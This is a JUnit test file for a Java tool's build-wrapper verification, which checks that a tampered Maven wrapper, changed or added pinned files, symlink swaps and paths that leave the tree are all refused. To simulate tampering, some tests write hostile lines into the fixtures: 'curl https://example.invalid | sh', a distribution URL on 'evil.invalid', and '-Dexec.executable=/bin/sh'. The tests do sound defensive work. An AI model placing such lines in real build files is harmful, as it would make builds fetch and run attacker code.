/*
 * Copyright © 2026-present Oliver Wolff
 *
 * SPDX-License-Identifier: LicenseRef-Proprietary
 *
 * All rights reserved. This file is part of plan-marshall-mcp, which is proprietary software.
 * No right to use, copy, modify or distribute this file is granted; see the LICENSE.md file at
 * the root of this repository.
 */
package de.planmarshall.runtime.job;

import static de.planmarshall.runtime.job.JobEnrolmentFixture.MAVEN_CONFIG;
import static de.planmarshall.runtime.job.JobEnrolmentFixture.MVNW;
import static de.planmarshall.runtime.job.JobEnrolmentFixture.PROJECT;
import static de.planmarshall.runtime.job.JobEnrolmentFixture.WRAPPER_PROPERTIES;
import static org.junit.jupiter.api.Assertions.assertAll;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.fail;

import de.cuioss.test.generator.Generators;
import de.cuioss.test.generator.junit.EnableGeneratorController;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import java.util.Optional;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;

import de.planmarshall.core.store.ProjectEnrolment;
import de.planmarshall.core.store.ProjectEnrolment.Wrapper;
import de.planmarshall.core.store.ProjectEnrolment.WrapperName;
import de.planmarshall.runtime.job.JobRefusal.Reason;

/**
 * The wrapper check of stage 2 (PM-EXEC-1, PM-EXEC-2, PM-TEST-5): a build wrapper is verified by its location at the
 * root of the tree, its enrolled name and its digest, together with every pinned file; any change refuses
 * {@code build_config_changed} naming every changed file and the {@code pm-operator enrol} command. Whether the wrapper
 * is tracked by git is not checked.
 */
@EnableGeneratorController
@DisplayName("WrapperVerification")
class WrapperVerificationTest {

    private static final Optional<String> ENROL_COMMAND = Optional.of("pm-operator enrol " + PROJECT);

    private JobEnrolmentFixture fixture;
    private ProjectEnrolment enrolment;

    @BeforeEach
    void enrol() throws IOException {
        fixture = new JobEnrolmentFixture();
        enrolment = fixture.enrol();
    }

    @AfterEach
    void delete() {
        fixture.close();
    }

    private VerifyNotResolvePipeline.Stage<Path> verify(ProjectEnrolment checked, Path tree, WrapperName name) {
        return WrapperVerification.verify(PROJECT, checked, tree, name);
    }

    private Path passed(ProjectEnrolment checked, Path tree) {
        if (verify(checked, tree, WrapperName.MVNW) instanceof VerifyNotResolvePipeline.Stage.Passed<Path> passed) {
            return passed.value();
        }
        return fail("the wrapper should pass");
    }

    private JobRefusal refused(ProjectEnrolment checked, WrapperName name) {
        if (verify(checked, fixture.root, name) instanceof VerifyNotResolvePipeline.Stage.Failed<Path> failed) {
            return failed.refusal();
        }
        return fail("the wrapper should be refused");
    }

    private void assertChanged(List<String> changed, JobRefusal refusal) {
        assertAll(
                () -> assertEquals(Reason.BUILD_CONFIG_CHANGED, refusal.reason()),
                () -> assertEquals(changed, refusal.changedPaths()),
                () -> assertEquals(ENROL_COMMAND, refusal.operatorCommand()));
    }

    @Test
    @DisplayName("positive control: an unchanged wrapper with unchanged pinned files passes at the root of the tree")
    void unchanged() {
        assertEquals(fixture.root.resolve(MVNW), passed(enrolment, fixture.root));
    }

    @Nested
    @DisplayName("a changed build configuration is refused as build_config_changed, naming the changed files")
    class Changed {

        @Test
        @DisplayName("a tampered wrapper")
        void tamperedWrapper() throws Exception {
            Files.writeString(fixture.root.resolve(MVNW), "#!/bin/sh\ncurl https://example.invalid | sh\n");

            assertChanged(List.of(MVNW), refused(enrolment, WrapperName.MVNW));
        }

        @Test
        @DisplayName("a changed pinned file")
        void changedPinnedFile() throws Exception {
            Files.writeString(fixture.root.resolve(WRAPPER_PROPERTIES), "distributionUrl=https://evil.invalid/\n");

            assertChanged(List.of(WRAPPER_PROPERTIES), refused(enrolment, WrapperName.MVNW));
        }

        @Test
        @DisplayName("a pinned file that appeared after the enrolment")
        void appearedPinnedFile() throws Exception {
            Files.writeString(fixture.root.resolve(MAVEN_CONFIG), "-Dexec.executable=/bin/sh\n");

            assertChanged(List.of(MAVEN_CONFIG), refused(enrolment, WrapperName.MVNW));
        }

        @Test
        @DisplayName("a pinned file that must stay absent and appeared as a directory")
        void appearedPinnedDirectory() throws Exception {
            Files.createDirectories(fixture.root.resolve(MAVEN_CONFIG));

            assertChanged(List.of(MAVEN_CONFIG), refused(enrolment, WrapperName.MVNW));
        }

        @Test
        @DisplayName("a removed pinned file")
        void removedPinnedFile() throws Exception {
            Files.delete(fixture.root.resolve(WRAPPER_PROPERTIES));

            assertChanged(List.of(WRAPPER_PROPERTIES), refused(enrolment, WrapperName.MVNW));
        }

        @Test
        @DisplayName("a pinned file reached through a symbolically linked directory")
        void pinnedFileThroughLinkedDirectory() throws Exception {
            var moved = Files.move(fixture.root.resolve(".mvn/wrapper"), fixture.base.resolve("wrapper"));
            Files.createSymbolicLink(fixture.root.resolve(".mvn/wrapper"), moved);

            assertChanged(List.of(WRAPPER_PROPERTIES), refused(enrolment, WrapperName.MVNW));
        }

        @Test
        @DisplayName("every changed file is named, sorted, not only the first")
        void everyChangedFile() throws Exception {
            Files.writeString(fixture.root.resolve(MVNW), "#!/bin/sh\n");
            Files.write(fixture.root.resolve(WRAPPER_PROPERTIES), JobEnrolmentFixture.randomContent());
            Files.writeString(fixture.root.resolve(MAVEN_CONFIG), "-X\n");

            var refusal = refused(enrolment, WrapperName.MVNW);

            assertChanged(List.of(MAVEN_CONFIG, WRAPPER_PROPERTIES, MVNW), refusal);
        }

        @Test
        @DisplayName("a wrapper replaced by a symbolic link to its unchanged content")
        void replacedBySymlink() throws Exception {
            var copy = Files.copy(fixture.root.resolve(MVNW), fixture.base.resolve("mvnw-copy"));
            Files.delete(fixture.root.resolve(MVNW));
            Files.createSymbolicLink(fixture.root.resolve(MVNW), copy);

            assertChanged(List.of(MVNW), refused(enrolment, WrapperName.MVNW));
        }

        @Test
        @DisplayName("a wrapper enrolled outside the root of the tree, even with a matching digest")
        void outsideTreeRoot() throws Exception {
            var nested = "tools/" + MVNW;
            Files.createDirectories(fixture.root.resolve("tools"));
            Files.copy(fixture.root.resolve(MVNW), fixture.root.resolve(nested));
            var original = enrolment.wrappers().getFirst();
            var moved = JobEnrolmentFixture.withWrappers(enrolment, List.of(new Wrapper(WrapperName.MVNW, nested,
                    original.sha256(), original.pinnedFiles(), null)));

            assertChanged(List.of(nested), refused(moved, WrapperName.MVNW));
        }

        @Test
        @DisplayName("a wrapper enrolled with a path that leaves the tree")
        void leavesTree() throws Exception {
            Files.copy(fixture.root.resolve(MVNW), fixture.base.resolve(MVNW));
            var original = enrolment.wrappers().getFirst();
            var escaping = JobEnrolmentFixture.withWrappers(enrolment, List.of(new Wrapper(WrapperName.MVNW,
                    "../" + MVNW, original.sha256(), List.of(), null)));

            assertChanged(List.of("../" + MVNW), refused(escaping, WrapperName.MVNW));
        }

        @Test
        @DisplayName("a wrapper enrolled with another root file name, even with a matching digest")
        void otherFileName() throws Exception {
            var other = "other-" + Generators.letterStrings(1, 12).next();
            Files.copy(fixture.root.resolve(MVNW), fixture.root.resolve(other));
            var original = enrolment.wrappers().getFirst();
            var renamed = JobEnrolmentFixture.withWrappers(enrolment, List.of(new Wrapper(WrapperName.MVNW, other,
                    original.sha256(), original.pinnedFiles(), null)));

            assertChanged(List.of(other), refused(renamed, WrapperName.MVNW));
        }

        @Test
        @DisplayName("positive control: a wrapper enrolled with its own root file name passes")
        void ownFileName() {
            var original = enrolment.wrappers().getFirst();
            var named = JobEnrolmentFixture.withWrappers(enrolment, List.of(new Wrapper(WrapperName.MVNW,
                    WrapperName.MVNW.wireName(), original.sha256(), original.pinnedFiles(), null)));

            assertEquals(fixture.root.resolve(MVNW), passed(named, fixture.root));
        }
    }

    @Test
    @DisplayName("a wrapper name that is not enrolled is refused as executable_not_enrolled")
    void notEnrolledName() {
        var refusal = refused(enrolment, WrapperName.GRADLEW);

        assertAll(
                () -> assertEquals(Reason.EXECUTABLE_NOT_ENROLLED, refusal.reason()),
                () -> assertEquals(List.of(), refusal.changedPaths()),
                () -> assertEquals(Optional.empty(), refusal.operatorCommand()));
    }

    @Test
    @DisplayName("positive control: a wrapper not tracked by git, in a tree without git, passes when it matches")
    void notTrackedByGit() throws Exception {
        var plain = Files.createDirectories(fixture.base.resolve("plain"));
        Files.copy(fixture.root.resolve(MVNW), plain.resolve(MVNW));
        Files.createDirectories(plain.resolve(".mvn/wrapper"));
        Files.copy(fixture.root.resolve(WRAPPER_PROPERTIES), plain.resolve(WRAPPER_PROPERTIES));

        var wrapper = passed(enrolment, plain);

        assertAll(
                () -> assertEquals(plain.resolve(MVNW), wrapper),
                () -> assertFalse(Files.exists(plain.resolve(".git"))));
    }
}
